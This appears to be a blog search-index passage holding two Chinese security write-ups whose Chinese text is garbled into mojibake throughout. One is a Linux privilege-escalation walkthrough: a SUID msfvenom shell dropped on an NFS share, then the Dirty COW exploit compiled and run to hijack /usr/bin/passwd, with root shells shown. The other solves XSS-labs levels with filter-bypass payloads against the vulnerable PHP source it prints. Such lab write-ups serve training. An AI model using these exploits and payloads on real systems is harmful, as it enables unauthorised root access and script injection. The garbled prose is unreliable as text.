\n\n//msfç”Ÿæˆä¸€ä¸ªpayloadå¹¶å°†å…¶ä¿å­˜åˆ°åˆšæ‰æŒ‚è½½çš„å…±äº«ç›®å½•ï¼ˆè¿™ä¸ªpayloadçš„ä½œç”¨æ˜¯è°ƒç”¨/bin/bashï¼‰\n\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 48 bytes\nFinal size of elf file: 132 bytes\nSaved as: /tmp/nfs/shell.elf\n                                                                                                                \nâ”Œâ”€â”€(rootã‰¿kali)-[/home/n3ym4r]\nâ””â”€# chmod +xs /tmp/nfs/shell.elf                //ä½¿payloadæ–‡ä»¶å¯æ‰§è¡Œå¹¶è®¾ç½® SUID æƒé™\n\nåˆ‡åˆ°ç›®æ ‡æœºæ™®é€šç”¨æˆ·ï¼Œæ‰§è¡Œpayloadæ–‡ä»¶\nuser@debian:~$ /tmp/shell.elf \nbash-4.1# id\nuid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\n\nå¾—åˆ°root\nå†…æ ¸æ¼æ´è¿è¡Œ Linux Exploit Suggester 2 å·¥å…·æ¥è¯†åˆ«å½“å‰ç³»ç»Ÿä¸Šæ½œåœ¨çš„å†…æ ¸æ¼æ´\nuser@debian:~$ perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl\n\n  #############################\n    Linux Exploit Suggester 2\n  #############################\n\n  Local Kernel: 2.6.32\n  Searching 72 exploits...\n\n  Possible Exploits\n  [1] american-sign-language\n      CVE-2010-4347\n      Source: http://www.securityfocus.com/bid/45408\n  [2] can_bcm\n      CVE-2010-2959\n      Source: http://www.exploit-db.com/exploits/14814\n  [3] dirty_cow\n      CVE-2016-5195\n      Source: http://www.exploit-db.com/exploits/40616\n  [4] exploit_x\n      CVE-2018-14665\n      Source: http://www.exploit-db.com/exploits/45697\n  [5] half_nelson1\n      Alt: econet       CVE-2010-3848\n      Source: http://www.exploit-db.com/exploits/17787\n  [6] half_nelson2\n      Alt: econet       CVE-2010-3850\n      Source: http://www.exploit-db.com/exploits/17787\n  [7] half_nelson3\n      Alt: econet       CVE-2010-4073\n      Source: http://www.exploit-db.com/exploits/17787\n  [8] msr\n      CVE-2013-0268\n      Source: http://www.exploit-db.com/exploits/27297\n  [9] pktcdvd\n      CVE-2010-3437\n      Source: http://www.exploit-db.com/exploits/15150\n  [10] ptrace_kmod2\n      Alt: ia32syscall,robert_you_suck       CVE-2010-3301\n      Source: http://www.exploit-db.com/exploits/15023\n  [11] rawmodePTY\n      CVE-2014-0196\n      Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c\n  [12] rds\n      CVE-2010-3904\n      Source: http://www.exploit-db.com/exploits/15285\n  [13] reiserfs\n      CVE-2010-1146\n      Source: http://www.exploit-db.com/exploits/12130\n  [14] video4linux\n      CVE-2010-3081\n      Source: http://www.exploit-db.com/exploits/15024\n\næŸ¥çœ‹è¾“å‡ºç¬¬ä¸‰æ¡è‘—åæ¼æ´â€”â€”è„ç‰›\nåˆ©ç”¨exp\næ‰§è¡Œexpä¼šå°†SUIDæ–‡ä»¶&#x2F;usr/bin/passwdæ›¿æ¢ä¸º ç”Ÿæˆshellçš„æ–‡ä»¶ï¼ˆä»å¤–åœ¨çœ‹ä¸å‡ºå˜åŒ–ï¼‰\nuser@debian:~$ gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w     //ç¼–è¯‘exp\nuser@debian:~$ ./c0w                                                                  //æ‰§è¡Œ\n                                \n   (___)                                   \n   (o o)_____/                             \n    @@ `     \\                            \n     \\ ____, //usr/bin/passwd                          \n     //    //                              \n    ^^    ^^                               \nDirtyCow root privilege escalation\nBacking up /usr/bin/passwd to /tmp/bak\nmmap 733f000\n\nmadvise 0\n\nptrace 0\n\nuser@debian:~$ /usr/bin/passwd                                             //æ‰§è¡Œæ›¿æ¢åçš„usr/bin/passwd\nroot@debian:/home/user# \nroot@debian:/home/user# id                                               //å¾—åˆ°root\nuid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\n\nè¿™é‡Œå­˜åœ¨çš„å…¶ä»–æ¼æ´å°±ä¸åšæ¼”ç¤ºäº†ï¼Œä½¿ç”¨expåˆ©ç”¨å³å¯ã€‚\næ€»ç»“  ææƒçš„æ–¹æ³•å¾ˆå¤šï¼Œè¦è§†å®é™…æƒ…å†µè€Œå®šï¼Œè¿™é‡Œä»‹ç»åˆ°çš„æ˜¯æœ€åŸºç¡€çš„ææƒæ–¹å¼ã€‚\n  ä¸€èˆ¬æµç¨‹ä¸ºï¼š\n1.é€šè¿‡å„ç§å‘½ä»¤è¿›è¡Œç®€å•ä¿¡æ¯æ”¶é›†\n2.åˆ©ç”¨æ£€æµ‹è„šæœ¬æ‰¹é‡å¿«é€Ÿæ”¶é›†å¯èƒ½åˆ©ç”¨çš„ææƒç‚¹\næ£€æµ‹å‡ºæ¼æ´ç›´æ¥åˆ©ç”¨\n3.æŸ¥çœ‹å„ç§æœåŠ¡ã€é…ç½®æ–‡ä»¶ã€å†å²æ–‡ä»¶çœ‹æœ‰æ²¡æœ‰æš´éœ²çš„å¯†ç \n4.sudo&#x2F;suid&#x2F;cronææƒ\n5.æŸ¥çœ‹å„ç§æœåŠ¡ã€ç¬¬ä¸‰æ–¹åº”ç”¨çš„ç‰ˆæœ¬ï¼Œçœ‹æœ‰æ— æ¼æ´åˆ©ç”¨ç‚¹ï¼Œå¦‚MySQLçš„udfææƒç­‰\n7.å†…æ ¸exp\n\nå‚è€ƒé“¾æ¥ï¼š\nhttps://tryhackme.com/room/linuxprivesc#\nhttps://github.com/carlospolop/hacktricks/blob/master/linux-hardening/privilege-escalation/README.md\nhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid\n\n","tags":["linux","ææƒ"]},{"title":"XSS-labsé€šå…³ç¬”è®°","url":"/2020/04/07/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/","content":"XSS-labsé€šå…³ç¬”è®°level 1\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œå°†nameçš„å‚æ•°å€¼ï¼Œæ’å…¥åˆ°äº† ä¸­ï¼Œè¿™é‡Œå°±æ˜¯åå°„å‹xssï¼Œç›´æ¥ç»™nameé‡æ–°èµ‹å€¼ã€‚\n\næœåŠ¡å™¨å¹¶æ²¡æœ‰è¿›è¡Œä»»ä½•çš„è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹æœåŠ¡å™¨ç«¯\næœåŠ¡å™¨ç«¯æºä»£ç &lt;/script&gt;\n&lt;title&gt;æ¬¢è¿æ¥åˆ°level1&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level1&lt;/h1&gt;\n&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;name&quot;];                                                         &#x2F;&#x2F;è¿™é‡Œå°†nameèµ‹å€¼ç»™äº†str\necho &quot;&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·&quot;.$str.&quot;&lt;/h2&gt;&quot;;       &#x2F;&#x2F;è¿™é‡Œç›´æ¥å°†stræ’å…¥äº†æ ‡ç­¾ä¹‹é—´,å¯¼è‡´åå°„å‹xsså½¢æˆ\n**?&gt;**\n&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;\n&lt;?php \necho &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\nlevel 2\nå¯ä»¥å‘ç°ï¼Œé€šè¿‡getä¼ å‚æäº¤ï¼Œç»è¿‡æœåŠ¡å™¨çš„åŠ¨æ€å¤„ç†ä¹‹ååˆä¼šå°†å‚æ•°keywordçš„å€¼æ’å…¥åˆ°&lt;h2&gt; &lt;/h2&gt;æ ‡ç­¾ä¹‹ä¸­ä»¥åŠ\næ·»åŠ åˆ°&lt;input&gt;æ ‡ç­¾ä¸­çš„valueå±æ€§çš„å€¼å†…ã€‚\næˆ‘ä»¬å°è¯•ç”¨ä¸Šå…³çš„payloadæäº¤\n\nå¯ä»¥çœ‹åˆ°ï¼Œåœ¨&lt;h2&gt; &lt;/h2&gt;æ ‡ç­¾ä¹‹ä¸­çš„æ¶æ„ä»£ç è¢«ç¼–ç äº†ï¼Œå…¶ä¸­&lt;å’Œ&gt;éƒ½è¢«ç¼–ç æˆäº†htmlå­—ç¬¦å®ä½“ï¼ŒçŒœæµ‹åœ¨æœåŠ¡å™¨ç«¯ç”¨htmlspecialchars()å‡½æ•°å¯¹keywordå‚æ•°çš„å€¼è¿›è¡Œäº†å¤„ç†ï¼Œæ¥ç€å¾€ä¸‹çœ‹å¯ä»¥çœ‹åˆ°æ’å…¥åˆ°valueå‚æ•°å€¼ä¸­çš„æ¶æ„ä»£ç å¹¶æ²¡æœ‰è¢«ç¼–ç è€Œæ˜¯ç›´æ¥åŸæ ·è¿”å›ï¼Œä½†æ˜¯é—®é¢˜æ˜¯è¿™é‡Œçš„jsä»£ç åœ¨æ ‡ç­¾å±æ€§å€¼ä¸­ï¼Œæµè§ˆå™¨æ˜¯æ— æ³•æ‰§è¡Œçš„ï¼Œæ—¢ç„¶ä¸Šé¢çš„æ¶æ„ä»£ç è¢«ç¼–ç äº†ï¼Œé‚£ä¹ˆåªèƒ½ä»å±æ€§å€¼ä¸­çš„æ¶æ„ä»£ç å¤„è¿›è¡Œçªç ´äº†ã€‚\nè¦æƒ³æµè§ˆå™¨æ‰§è¡Œè¿™é‡Œçš„å¼¹çª—ä»£ç ï¼Œåªéœ€è¦å°†å±æ€§çš„å¼•å·å’Œæ ‡ç­¾å…ˆé—­åˆå°±å¯ä»¥äº†\nç”¨â€&gt;é—­åˆå‰é¢çš„&lt;inputï¼Œå†ç”¨&#x2F;&#x2F;å°†åé¢çš„â€æ³¨é‡Šæ‰ã€‚\npayloadï¼šn3ym4r&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;//\næœåŠ¡å™¨ç«¯æºä»£ç &lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];&#x2F;&#x2F;å°†getæ–¹å¼ä¼ é€’åˆ°æœåŠ¡å™¨ç«¯çš„keywordå‚æ•°çš„å€¼èµ‹ç»™strå˜é‡\necho &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n &#x2F;&#x2F;ç”¨htmlspecialchars()å‡½æ•°å¯¹å˜é‡strè¿›è¡Œå¤„ç†ä¹‹åæ˜¾ç¤ºåˆ°ç½‘é¡µä¸Š\n&lt;form action=level2.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;&#x2F;&#x2F;ç›´æ¥å°†å˜é‡å€¼æ’å…¥åˆ°äº†&lt;input&gt;æ ‡ç­¾çš„valueå±æ€§å€¼ä¸­\n&lt;input type=submit name=submit value=&quot;æœç´¢&quot;/&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;\n&lt;?php \necho &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;\n?&gt;\nlevel 3ç®€å•æµ‹è¯•ï¼Œå‘ç°ä¸ç¬¬äºŒå…³ç›¸æ¯”ï¼Œè¿™é‡Œå°†å±æ€§å€¼è¿™é‡Œä¹Ÿè¿›è¡Œäº†htmlspecialchars()å‡½æ•°å¤„ç†ã€‚\n\nè¿™é‡Œï¼Œæ— æ³•ä½¿ç”¨æ ‡ç­¾ï¼Œå› ä¸ºæ ‡ç­¾éƒ½æ˜¯å¸¦æœ‰&lt;&gt;ç¬¦å·çš„ï¼Œå°±ä¼šè¢«è½¬ä¹‰ã€‚ä½†è¯¥å‡½æ•°ä¸ä¼šè½¬ä¹‰å•å¼•å·ï¼Œå¯ä»¥é‡‡ç”¨äº‹ä»¶é—­åˆæ ‡ç­¾ã€‚\npayload &#39; onclick=&#39;alert(1)&#x2F;&#x2F;å½“å•å‡»é¼ æ ‡æ—¶è¿è¡Œè„šæœ¬\n&#39; onmouseover=&#39;alert(1)&#x2F;&#x2F;å½“é¼ æ ‡æŒ‡é’ˆç§»è‡³å…ƒç´ ä¹‹ä¸Šæ—¶è¿è¡Œè„šæœ¬\næºä»£ç &lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\necho &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;\n&lt;form action=level3.php method=GET&gt;\n&lt;input name=keyword  value=&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;   \n&lt;input type=submit name=submit value=æœç´¢ /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&quot;;\n?&gt;\nhtmlspecialchars ()å°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸ºhtmlå®ä½“\nlevel 4\nå¯ä»¥çœ‹åˆ°&lt;&gt;ç¬¦å·è¢«æ›¿æ¢æˆäº†ç©º\nä½†æ˜¯äº‹ä»¶ä¸éœ€è¦ç”¨åˆ°&lt;&gt;ï¼Œæ‰€ä»¥ç›´æ¥ç”¨é¼ æ ‡äº‹ä»¶æ’å…¥\npayload&quot; onmouseover=&quot;alert(/xss/)\næˆ‘ä»¬è¿˜æ˜¯åŒæ ·éœ€è¦é—­åˆä»–åŸæ¥çš„è¯­å¥ã€‚\næºä»£ç &lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str); \n$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);&#x2F;&#x2F;å°†&lt;&gt;æ›¿æ¢ä¸ºç©º\necho &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form action=level4.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;\n&lt;input type=submit name=submit value=æœç´¢ /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\nlevel 5æºä»£ç &lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = strtolower($_GET[&quot;keyword&quot;]);\n$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);\n$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);\necho &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form action=level5.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;\n&lt;input type=submit name=submit value=æœç´¢ /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\nå¯ä»¥çœ‹åˆ°å°†&lt;scriptæ›¿æ¢ä¸ºäº†&lt;scr_ipt,åŒæ—¶ä¹Ÿå°†onæ›¿æ¢ä¸ºäº†o_n,è¿™ä½¿å¾—æˆ‘ä»¬æ— æ³•é€šè¿‡&lt;script&gt;æ ‡ç­¾æˆ–è§¦å‘äº‹ä»¶æ¥æ‰§è¡Œjsä»£ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ¢ä¸ªæ ‡ç­¾ï¼Œä½¿ç”¨aæ ‡ç­¾çš„jsä¼ªåè®®å®ç°hrefå±æ€§æ”¯æŒjavascript:ä¼ªåè®®æ„é€ poc äº§ç”Ÿä¸€ä¸ªé“¾æ¥\npayload&quot;&gt; &lt;a href=javascript:alert(&#39;xss&#39;) &gt; xss&lt;/a&gt; //\nlevel 6æºä»£ç &lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);&#x2F;&#x2F;é™åˆ¶&lt;scriptæ¶æ„ä»£ç \n$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);&#x2F;&#x2F;é™åˆ¶å¸¦onçš„äº‹ä»¶\n$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);&#x2F;&#x2F;é™åˆ¶å›¾ç‰‡æ ‡ç­¾ï¼Œ&lt;img src&#x3D;111 onerror&#x3D;alert(â€˜xssâ€™)&gt;\n$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);&#x2F;&#x2F;data:å¯¹å­—ç¬¦ç¼–ç çš„ä¸€ç§è®¾å®š\n$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);&#x2F;&#x2F;é™åˆ¶é€šè¿‡åœ¨hrefå±æ€§ä¸­æ’å…¥jsä»£ç æ¥ç‚¹å‡»æ‰§è¡Œ\necho &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form action=level6.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;\n&lt;input type=submit name=submit value=æœç´¢ /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\nå¯ä»¥çœ‹åˆ°åšäº†å¾ˆå¤šé™åˆ¶ï¼Œä½†æ˜¯éƒ½æ˜¯åˆ¤æ–­çš„æ•´ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥å¤§å°å†™ç»•è¿‡\npayload&quot;&gt;&lt;sCrIpt&gt;alert(/xss/)&lt;/ScRipt&gt;\nlevel 7æºä»£ç &lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str =strtolower( $_GET[&quot;keyword&quot;]);\n$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);&#x2F;&#x2F;å°†scriptæ›¿æ¢ä¸ºç©ºï¼Œä»¥ä¸‹åŒç†\n$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);\n$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);\n$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);\n$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);\necho &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form action=level7.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;\n&lt;input type=submit name=submit value=æœç´¢ /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\nå› ä¸ºåªä¼šå¯¹æ•´ä¸ªå­—ç¬¦ä¸²è¿›è¡Œä¸€æ¬¡æ›¿æ¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡\npayload&quot;&gt;&lt;scscriptript&gt;alert(1)&lt;/scrscriptipt&gt;\nlevel 8æºä»£ç &lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = strtolower($_GET[&quot;keyword&quot;]);\n$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);\n$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);\n$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);\n$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);\n$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);\n$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);\necho &#39;&lt;center&gt;\n&lt;form action=level8.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;\n&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n&lt;?php\n echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#39;; &#x2F;&#x2F;åœ¨è¿™é‡Œè¿›è¡Œæ‹¼æ¥\n?&gt;\n&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;\n&lt;?php \necho &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;\n?&gt;\nå¯ä»¥çœ‹åˆ°å°†å¤§éƒ¨åˆ†èƒ½ç”¨åˆ°çš„å­—ç¬¦éƒ½åšäº†ç ´åï¼Œçœ‹åˆ°å‹æƒ…é“¾æ¥é‚£é‡Œï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç¼–ç çš„æ–¹å¼ç»•è¿‡\n\npayload&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;\nlevel 9æºä»£ç &lt;?php \n\nini_set(&quot;display_errors&quot;, 0);\n\n$str = strtolower($_GET[&quot;keyword&quot;]);\n\n$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);\n\n$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);\n\n$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);\n\n$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);\n\n$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);\n\n$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);\n\necho &#39;&lt;center&gt;\n\n&lt;form action=level9.php method=GET&gt;\n\n&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;\n\n&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;\n\n&lt;/form&gt;\n\n&lt;/center&gt;&#39;;\n\n?&gt;\n\n&lt;?php\n\nif(false===strpos($str7,&#39;http://&#39;))  \n\n&#123;\n\n echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#39;;\n\n   &#125;\n\nelse\n\n&#123;\n\n echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#39;;\n\n&#125;\n\n?&gt;\n\n&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;\n\n&lt;?php \n\necho &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;\n\n?&gt;\n\nif(false&#x3D;&#x3D;&#x3D;strpos($str7,â€™http:&#x2F;&#x2F;â€˜))  åˆ¤æ–­æ˜¯å¦åŒ…å«http:&#x2F;&#x2F;ç„¶åè¿”å›,è¿™é‡Œè¿˜æ˜¯å¯ä»¥é€šè¿‡ç¼–ç æ¥ç»•è¿‡\npayload&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://\nlevel 10\nå¯ä»¥çœ‹åˆ°æœ‰ä¸‰ä¸ªinputæ ‡ç­¾ï¼Œæˆ‘ä»¬å¾—æµ‹è¯•å‡ºå“ªä¸ªè¡¨å•å¯ä»¥çªç ´\næ„é€ è¯­å¥ï¼š?keyword=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&amp;t_link=&quot; type=&quot;text&quot;&amp;t_history=&quot; type=&quot;text&quot;&amp;t_sort=&quot; type=&quot;text&quot;\n\nt_sortæ—¶ï¼Œå‡ºç°ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç¡®å®šäº†\npayload?keyword=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)\næºä»£ç æˆ‘ä»¬å¯ä»¥å†çœ‹çœ‹æºä»£ç \n&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str11 = $_GET[&quot;t_sort&quot;];\n$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);\n$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);\necho &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\nå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„çŒœæµ‹æ²¡é”™,å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œä¼šå°†&lt;&gt;æ›¿æ¢ä¸ºç©ºï¼Œä¸èƒ½é€šè¿‡é—­åˆinputï¼Œå¼•å…¥æ–°çš„æ ‡ç­¾æ¥è§¦å‘ï¼Œåªèƒ½é€šè¿‡äº‹ä»¶æ¥è§¦å‘ã€‚\nlevel 11æºä»£ç &lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str00 = $_GET[&quot;t_sort&quot;];\n$str11=$_SERVER[&#39;HTTP_REFERER&#39;];\n$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);\n$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);\necho &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_ref&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\nè¿™ä¸€å…³å¡å’Œä¸Šé¢çš„ä¸€å…³éå¸¸çš„åƒå¤šäº†ä¸€ä¸ªinputè¡¨å•çš„ä¿¡æ¯ï¼Œåœ¨æœåŠ¡å™¨ç«¯è¿˜å°†è¯·æ±‚å¤´ä¸­çš„refererå¤´çš„å€¼èµ‹ç»™äº†str11è¿™ä¸ªå˜é‡ï¼Œ$_SERVER[â€˜HTTP_REFERERâ€™]  #é“¾æ¥åˆ°å½“å‰é¡µé¢çš„å‰ä¸€é¡µé¢çš„ URL åœ°å€ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œå¯ä»¥åšç‚¹æ–‡ç« ã€‚åœ¨å°†å˜é‡å€¼ä¸­çš„&lt;å’Œ&gt;åˆ é™¤ä¹‹åå°±ä¼šæ’å…¥åˆ°t_refè¿™ä¸ªæ ‡ç­¾çš„valueå±æ€§å€¼ä¸­ã€‚è€Œä¸Šä¸€å…³çš„t_sortæ 